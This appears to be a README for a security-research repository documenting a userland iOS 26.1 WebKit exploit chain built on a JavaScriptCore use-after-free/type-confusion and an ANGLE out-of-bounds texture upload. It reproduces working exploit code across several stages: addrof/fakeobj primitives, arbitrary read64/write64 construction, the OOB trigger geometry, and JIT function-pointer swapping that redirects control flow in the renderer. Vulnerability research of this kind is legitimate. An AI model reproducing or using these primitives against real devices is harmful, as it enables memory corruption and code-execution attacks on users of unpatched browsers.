# WebKit-UAF-ANGLE-OOB-Analysis (CVE-2025-43529, CVE-2025-14174)

This repository documents a userland exploit chain on iOS 26.1 that combines:

1. JavaScriptCore UAF/type-confusion primitives (CVE-2025-43529 path).
2. ANGLE/Metal upload corruption evidence in GPU process (CVE-2025-14174 path).

The chain is focused on userland WebKit compromise. It does not claim kernel compromise or jailbreak.

**Author:** [zeroxjf](https://x.com/zeroxjf)<br>
**Based on:** [jir4vv1t's CVE-2025-43529 exploit](https://github.com/jir4vv1t/CVE-2025-43529)<br>
**Status:** Userland PoC chain validated (renderer + GPU evidence)<br>

---

## Chain summary

### Stage 1: Renderer compromise (CVE-2025-43529 path)

The JSC DFG store-barrier bug allows GC misuse when Phi/Upsilon escape state is inconsistent.  
That yields a UAF + butterfly reclaim pattern, then boxed/unboxed confusion for:

1. `addrof(obj)` to leak JS object addresses.
2. `fakeobj(addr)` to materialize forged object references.
3. Inline-slot memory reads/writes on chosen object fields.

This stage establishes memory primitives inside `WebContent`.

```javascript
// Stage 1 leak path (boxed/unboxed confusion)
boxed_arr[0] = preAllocatedTargets.stage6FuncA;
leakedAddrs.stage6FuncA = ftoi(unboxed_arr[0]);
boxed_arr[0] = preAllocatedTargets.stage6FuncB;
leakedAddrs.stage6FuncB = ftoi(unboxed_arr[0]);

// Stage 1 read/write primitive construction via inline slot access
exploitState.read64 = function(addr) {
    unboxed_arr[0] = itof(addr - 0x10n);
    const v = boxed_arr[0].slot0;
    if (typeof v === 'number') return ftoi(v);
    if ((typeof v === 'object' && v !== null) || typeof v === 'function') {
        boxed_arr[0] = v;
        const bits = ftoi(unboxed_arr[0]);
        boxed_arr[0] = preAllocatedTargets.testObject;
        return bits;
    }
    return 0x7ff8000000000000n;
};
exploitState.write64 = function(addr, val) {
    unboxed_arr[0] = itof(addr - 0x10n);
    boxed_arr[0].slot0 = itof(val);
};
```

### Stage 2: GPU canary harness setup

Before triggering ANGLE corruption, the chain initializes a baseline canary harness in WebGL2 for post-trigger diffing.

```javascript
const gl = ensureGL2Context();
exploitState.gpuHarness = setupGPUCanaryHarness(gl);
exploitState.gl = gl;
exploitState.gpuContextLost = false;
evidence.gpuCanaryCorruption = false;
evidence.gpuHeapCorruption = false;
```

### Stage 3: ANGLE corruption path (CVE-2025-14174 path)

The trigger uses texture upload with mismatched allocation/write geometry (`UNPACK_IMAGE_HEIGHT`), producing OOB write conditions in GPU upload handling.  
The probe then evaluates heap-oracle and canary deltas.

```javascript
// Core OOB shape
const allocatedSize = (width * 4) * unpackImageHeight;
const actualWriteSize = (width * 4) * height;
const oobWriteSize = Math.max(0, actualWriteSize - allocatedSize);

gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);
gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
              width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```

```javascript
// Trigger loop + corruption evidence checks
const oracleResult = triggerANGLEWithHeapOracle(gl, cfg, seed);
if (oracleResult.scanResult.changed) {
    evidence.gpuHeapCorruption = true;
    evidence.angleCorruptionDetected = true;
}
const diff = diffGPUCanaries(harness.baseline, snapshotGPUCanaries(gl, harness));
if (diff.changed) {
    evidence.gpuCanaryCorruption = true;
    evidence.angleCorruptionDetected = true;
}
```

This stage demonstrates independent GPU-process corruption evidence reachable from malicious web content.

### Stage 4: Integration gate

The chain marks itself ready only when both conditions hold in one run:

1. Renderer primitives are working.
2. ANGLE corruption path executed with GPU evidence.

```javascript
const rendererPrims = evidence.addrofWorks && evidence.fakeobjWorks;
const gpuEvidence = evidence.angleCorruptionDetected || evidence.gpuContextLost;
const angleExecuted = evidence.angleTriggered;
evidence.chainReady = rendererPrims && angleExecuted && gpuEvidence;
```

### Stage 5: Live in-process arbitrary read/write proof

Stage 5 validates `read64/write64` against a live probe object with strict equality checks:

1. Raw read must match JS-visible value.
2. Marker write must match in both raw memory and JS-visible property.
3. Restore must return to original value in both views.
4. NaN fallback values are rejected as success.

This stage is specifically designed to avoid stale-address or self-consistent false positives.

```javascript
const jsBefore = ftoi(stage5Probe.slot0);
const v = exploitState.read64(candidate.addr + 0x10n);
const ok = (v === jsBefore) && (v !== 0x7ff8000000000000n);

exploitState.write64(slot0Addr, writeMarkerWord);
const markerRead = exploitState.read64(slot0Addr);
const jsMarker = ftoi(stage5Probe.slot0);

exploitState.write64(slot0Addr, secretWord);
const restoreRead = exploitState.read64(slot0Addr);
const jsRestore = ftoi(stage5Probe.slot0);

const readOk = (baselineWord === secretWord) && (baselineWord === jsBefore);
const writeOk = (markerRead === writeMarkerWord) && (jsMarker === writeMarkerWord) &&
                (restoreRead === secretWord) && (jsRestore === secretWord);
```

### Stage 6: Native execution-path control proof

Two JIT’d functions with distinct behavior are used as A/B targets.  
The chain swaps a function executable field and validates:

1. A executes B behavior during swap.
2. A returns to original behavior after restore.
3. Witness side effects confirm true path redirection.

This proves userland control-flow impact in renderer, beyond pure data corruption.

```javascript
stage6FuncA = function(x) {
    if (x === 0x515151) return 0x11111111;
    return (x ^ 0x55aa) | 0;
};
stage6FuncB = function(x) {
    if (x === 0x515151) {
        window.__stage6_native_witness = ((window.__stage6_native_witness || 0) + 1) | 0;
        return 0x22222222;
    }
    return (((x * 3) | 0) ^ 0x123456) | 0;
};
```

```javascript
const fieldA = leakA + 0x18n;
const fieldB = leakB + 0x18n;
const dst = exploitState.fakeobj(fieldA - 0x10n);
const src = exploitState.fakeobj(fieldB - 0x10n);
const orig = dst.slot0;
dst.slot0 = src.slot0;
const swapped = fnA(testArg);
const w0 = (window.__stage6_native_witness || 0) | 0;
fnA(0x515151);
const w1 = (window.__stage6_native_witness || 0) | 0;
dst.slot0 = orig;
const restored = fnA(testArg);
```

---

## Current capability model

Working in userland:

1. Renderer memory corruption primitives (`addrof`, `fakeobj`, validated `read64/write64` path).
2. Native behavior redirection in renderer (Stage 6 swap/restore).
3. GPU-process corruption signal path through ANGLE trigger.

Not part of this chain:

1. Renderer-to-kernel escalation.
2. Sandbox escape primitive implementation.
3. Root/jailbreak persistence.

---

## Why two CVEs are in one writeup

CVE-2025-43529 and CVE-2025-14174 were reported in the same real-world campaign context.  
This repository keeps both paths in one probe to study:

1. Renderer exploitability and primitive quality.
2. GPU corruption reachability from web content.
3. Practical composition boundaries between the two processes.

---

## Repository layout

```text
├── README.md
├── AGENTS.md
├── poc/
│   └── chained_exploit_probe.html
└── analysis/
    ├── angle_call_chain.md
    ├── pac_analysis.md
    ├── crash_logs/
    ├── frida/
    │   ├── gpu_angle_path_trace.js
    │   └── webcontent_webgl_trace.js
    └── tools/
        ├── beacon_http_server.py
        ├── vphone_chain_watchdog.sh
        └── vphone_recover.sh
```

---

## Acknowledgments

Credit to **[jir4vv1t](https://github.com/jir4vv1t/CVE-2025-43529)** for the foundational CVE-2025-43529 trigger and primitive work.

---

## References

- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)
- WebKit Bugzilla: 302502, 303614
- Apple iOS 26 security advisories
